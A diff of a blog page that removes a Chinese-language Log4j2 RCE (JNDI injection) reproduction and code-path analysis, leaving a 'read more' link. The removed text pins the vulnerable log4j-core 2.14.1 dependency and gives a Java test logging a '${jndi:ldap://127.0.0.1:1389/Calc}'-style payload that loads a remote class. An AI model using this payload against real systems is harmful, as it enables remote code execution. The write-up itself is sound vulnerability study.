@@ -181,26 +181,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="Log4j2-RCE漏洞复现"><a href="#Log4j2-RCE漏洞复现" class="headerlink" title="Log4j2 RCE漏洞复现"></a>Log4j2 RCE漏洞复现</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Log4j2漏洞是由于Log4j2在解析错误日志时，支持将<code>${}</code>中的内容使用JNDI lookup解析并未对内容做限制，导致的JNDI注入。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用maven引入log4j2依赖</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Logger logg = LogManager.getLogger();</span><br><span class="line">        logg.error(<span class="string">"$&#123;jndi:ladp://127.0.0.1:1389/Calc&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>只要日志内容中含有如下payload就会触发漏洞，漏洞触发点在MessagePatternConverter类中的format方法，跟如分析。</p>
-<p><img src="/images/log4j2%E5%88%86%E6%9E%90/image-20220227111355957.png" alt="image-20220227111355957"></p>
-<p>在format方法中首先判断是否允许Lookup，在当前版本中是默认支持的，然后在日志内容中截取以<code>${</code>开头之后的内容，之后传入substitute方法中，首先substitute会将<code>${}</code>中的内容截取出来存入varNameExpr变量中，继续调用substitue方法，这里是为了处理嵌套<code>${}</code>。</p>
-<p><img src="/images/log4j2%E5%88%86%E6%9E%90/image-20220227113006823.png" alt="image-20220227113006823"></p>
-<p>分析完毕后，调用resolveVariable方法。</p>
-<p><img src="/images/log4j2%E5%88%86%E6%9E%90/image-20220227114147081.png" alt="image-20220227114147081"></p>
-<p>首先获取resolver，在strLookupMap中含有是所支持的所有lookup方法，可以看到支持jndilookup，之后进入resolver的lookup方法中。</p>
-<p><img src="/images/log4j2%E5%88%86%E6%9E%90/image-20220227114556050.png" alt="image-20220227114556050"></p>
-<p>截取<code>:</code>前的prefix然后去strLookup中寻找Jndilookup调用其lookup方法，JNDIName就是我们payload:<code>ldap://127.0.0.1:1389/Calc</code>。</p>
-<p><img src="/images/log4j2%E5%88%86%E6%9E%90/image-20220227114822924.png" alt="image-20220227114822924"></p>
-<p>接下来就是正常JNDI注入流程了。</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在2.15.0版本之后，默认不开启JNDI LookUp，而且在JndiManager的lookup方法中新增了许多限制。</p>
-<p><img src="/images/log4j2%E5%88%86%E6%9E%90/image-20220227173001925.png" alt="image-20220227173001925"></p>
-<p>限制了主机名为只能为localhost，而且限制了LDAP serialized_data字段中的类名，应该是为了防止高版本LDAP利用本地gadget。</p>
-
+        
+          <a class="article-more-a" href="/2022/01/27/log4j2分析/#more">more >></a>
+        
       
 
       
